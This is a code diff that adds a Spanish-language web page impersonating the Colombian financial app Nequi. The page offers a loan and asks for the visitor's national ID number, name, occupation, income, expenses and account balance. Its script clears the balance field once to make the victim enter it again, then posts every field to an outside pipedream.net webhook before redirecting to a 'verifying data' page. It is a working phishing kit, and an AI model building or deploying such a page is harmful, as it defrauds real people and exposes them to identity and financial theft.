@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Valida tus datos</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1a1a2e;
+        }
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            padding: 10px 0;
+        }
+        .logo-img {
+            width: 45px;
+            height: 45px;
+        }
+        .logo-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #21002b;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+        .hero-image {
+            width: 100%;
+            margin-bottom: 25px;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .amount-section {
+            background: #f8f0ff;
+            padding: 20px;
+            border-radius: 18px;
+            margin-bottom: 25px;
+        }
+        .amount-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .amount-value {
+            font-size: 36px;
+            font-weight: 700;
+            color: #ff008c;
+            margin-bottom: 10px;
+        }
+        input[type="range"] {
+            width: 100%;
+            accent-color: #ff008c;
+            height: 6px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 15px 16px;
+            background: #f5f5f5;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            font-size: 15px;
+            color: #1a1a2e;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #ff008c;
+            background: #ffffff;
+        }
+        .form-group input::placeholder {
+            color: #999;
+        }
+        .form-group input.error {
+            border-color: #e53935 !important;
+            background: #fff5f5;
+        }
+        .cuotas-section {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .cuota-btn {
+            flex: 1;
+            padding: 14px;
+            background: #f5f5f5;
+            border: 2px solid #e0e0e0;
+            border-radius: 14px;
+            color: #333;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+        .cuota-btn.active {
+            background: #ff008c;
+            border-color: #ff008c;
+            color: white;
+        }
+        .fecha-pago {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 18px 0;
+        }
+        .fecha-btn {
+            width: 55px;
+            height: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+            border: 2px solid #e0e0e0;
+            border-radius: 50%;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .fecha-btn.active {
+            background: #ff008c;
+            border-color: #ff008c;
+            color: white;
+        }
+        .resumen {
+            background: #f8f0ff;
+            padding: 25px;
+            border-radius: 18px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        .resumen-cuota {
+            font-size: 42px;
+            font-weight: 700;
+            color: #21002b;
+        }
+        .btn-solicitar {
+            width: 100%;
+            padding: 18px;
+            background: #cccccc;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin: 15px 0 30px;
+            transition: all 0.3s;
+        }
+        .btn-solicitar.active {
+            background: #ff008c;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 0, 140, 0.3);
+        }
+        .btn-solicitar.active:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 0, 140, 0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-img">
+                <img src="https://i.ibb.co/HDycgPYf/nequi.png" alt="Nequi">
+            </div>
+            <h1>Nequi</h1>
+        </div>
+        
+        <div class="subtitle">Valida tus datos y solicita tu crédito</div>
+        
+        <div class="hero-image">
+            <img src="https://i.ibb.co/234KmNVY/hero1.png" alt="Hero">
+        </div>
+        
+        <div class="amount-section">
+            <div class="amount-label">¿Cuánto necesitas?</div>
+            <div class="amount-value" id="amountDisplay">100.000</div>
+            <input type="range" id="amountSlider" min="100000" max="5000000" step="50000" value="100000">
+        </div>
+        
+        <div class="form-group">
+            <label>Ingresa tu cédula</label>
+            <input type="text" id="cedula" placeholder="Ej: 1234567890">
+        </div>
+        
+        <div class="form-group">
+            <label>Nombre y apellido</label>
+            <input type="text" id="nombre" placeholder="Ej: Juan Pérez">
+        </div>
+        
+        <div class="form-group">
+            <label>Selecciona tu ocupación</label>
+            <select id="ocupacion">
+                <option value="">Selecciona una opción</option>
+                <option value="empleado">Empleado</option>
+                <option value="independiente">Independiente</option>
+                <option value="estudiante">Estudiante</option>
+                <option value="pensionado">Pensionado</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label>Ingresos mensuales</label>
+            <input type="text" id="ingresos" placeholder="$" oninput="formatNumber(this)">
+        </div>
+        
+        <div class="form-group">
+            <label>Gastos mensuales</label>
+            <input type="text" id="gastos" placeholder="$" oninput="formatNumber(this)">
+        </div>
+        
+        <div class="form-group">
+            <label>Saldo actual en tu cuenta NEQUI</label>
+            <input type="text" id="saldo" placeholder="$" oninput="formatNumber(this)">
+        </div>
+        
+        <p style="font-size: 16px; font-weight: 500; margin: 20px 0 10px;">¿En cuánto tiempo quieres pagar tu préstamo?</p>
+        
+        <div class="cuotas-section">
+            <div class="cuota-btn active" data-cuotas="6">6 meses</div>
+            <div class="cuota-btn" data-cuotas="12">12 meses</div>
+            <div class="cuota-btn" data-cuotas="24">24 meses</div>
+        </div>
+        
+        <p style="font-size: 16px; font-weight: 500; margin: 20px 0 10px;">Elige tu fecha de pago</p>
+        
+        <div class="fecha-pago">
+            <div class="fecha-btn" data-dia="1">1</div>
+            <div class="fecha-btn" data-dia="10">10</div>
+            <div class="fecha-btn active" data-dia="15">15</div>
+            <div class="fecha-btn" data-dia="20">20</div>
+            <div class="fecha-btn" data-dia="25">25</div>
+            <div class="fecha-btn" data-dia="30">30</div>
+        </div>
+        
+        <div class="resumen">
+            <p style="font-size: 16px; margin-bottom: 10px;">Así quedarían tus cuotas</p>
+            <div class="resumen-cuota">0</div>
+            <p style="font-size: 14px; opacity: 0.7; margin-top: 5px;">mensuales</p>
+        </div>
+        
+        <button class="btn-solicitar" id="btnSolicitar" disabled>Solicitar Crédito</button>
+    </div>
+
+    <script>
+        const slider = document.getElementById('amountSlider');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const btnSolicitar = document.getElementById('btnSolicitar');
+        
+        const cedula = document.getElementById('cedula');
+        const nombre = document.getElementById('nombre');
+        const ocupacion = document.getElementById('ocupacion');
+        const ingresos = document.getElementById('ingresos');
+        const gastos = document.getElementById('gastos');
+        const saldo = document.getElementById('saldo');
+        
+        const campos = [cedula, nombre, ocupacion, ingresos, gastos, saldo];
+        
+        let saldoValidado = false;
+        
+        function formatNumber(input) {
+            let value = input.value.replace(/\./g, '').replace(/\D/g, '');
+            if (value) {
+                value = parseInt(value).toLocaleString('de-DE');
+                input.value = value;
+            }
+            validarCampos();
+        }
+        
+        function formatSliderNumber(num) {
+            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        }
+        
+        slider.addEventListener('input', function() {
+            amountDisplay.textContent = formatSliderNumber(this.value);
+        });
+        
+        document.querySelectorAll('.cuota-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.cuota-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                validarCampos();
+            });
+        });
+        
+        document.querySelectorAll('.fecha-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.fecha-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                validarCampos();
+            });
+        });
+        
+        function validarCampos() {
+            let todosLlenos = true;
+            
+            campos.forEach(campo => {
+                if (!campo.value.trim()) {
+                    todosLlenos = false;
+                }
+            });
+            
+            if (todosLlenos) {
+                btnSolicitar.disabled = false;
+                btnSolicitar.classList.add('active');
+            } else {
+                btnSolicitar.disabled = true;
+                btnSolicitar.classList.remove('active');
+            }
+        }
+        
+        campos.forEach(campo => {
+            campo.addEventListener('input', function() {
+                if (this.id === 'ingresos' || this.id === 'gastos' || this.id === 'saldo') {
+                    // Ya tiene oninput
+                } else {
+                    validarCampos();
+                }
+            });
+        });
+        
+        btnSolicitar.addEventListener('click', function(e) {
+            if (this.disabled) return;
+            
+            if (!saldoValidado) {
+                e.preventDefault();
+                
+                // Borrar el campo de saldo
+                saldo.value = '';
+                
+                // Agregar clase de error (borde rojo)
+                saldo.classList.add('error');
+                
+                saldoValidado = true;
+                btnSolicitar.disabled = true;
+                btnSolicitar.classList.remove('active');
+                saldo.focus();
+                
+                return;
+            }
+            
+            const montoSeleccionado = slider.value;
+            localStorage.setItem('montoCredito', montoSeleccionado);
+            const webhookURL = 'https://eo8ne5wlaz6wu8g.m.pipedream.net';
+
+const datos = {
+    cedula: cedula.value,
+    nombre: nombre.value,
+    ocupacion: ocupacion.value,
+    ingresos: ingresos.value,
+    gastos: gastos.value,
+    saldo: saldo.value,
+    monto: amountDisplay.textContent,
+    cuotas: document.querySelector('.cuota-btn.active').dataset.cuotas,
+    fechaPago: document.querySelector('.fecha-btn.active').dataset.dia
+};
+
+const mensaje = `📋 **DATOS PERSONALES**\n` +
+                `👤 Cédula: ${datos.cedula}\n` +
+                `📛 Nombre: ${datos.nombre}\n` +
+                `💼 Ocupación: ${datos.ocupacion}\n` +
+                `💰 Ingresos: $${datos.ingresos}\n` +
+                `📤 Gastos: $${datos.gastos}\n` +
+                `🏦 Saldo NEQUI: $${datos.saldo}\n` +
+                `💳 Monto solicitado: $${datos.monto}\n` +
+                `📅 Plazo: ${datos.cuotas} meses\n` +
+                `🔢 Fecha de pago: Día ${datos.fechaPago}`;
+
+fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: mensaje })
+}).finally(() => {
+    window.location.href = 'verificando-datos.html';
+});
+        });
+        
+        saldo.addEventListener('input', function() {
+            if (saldoValidado && this.value.trim() !== '') {
+                saldo.classList.remove('error');
+                validarCampos();
+            }
+        });
+        
+        validarCampos();
+    </script>
+</body>
+</html>
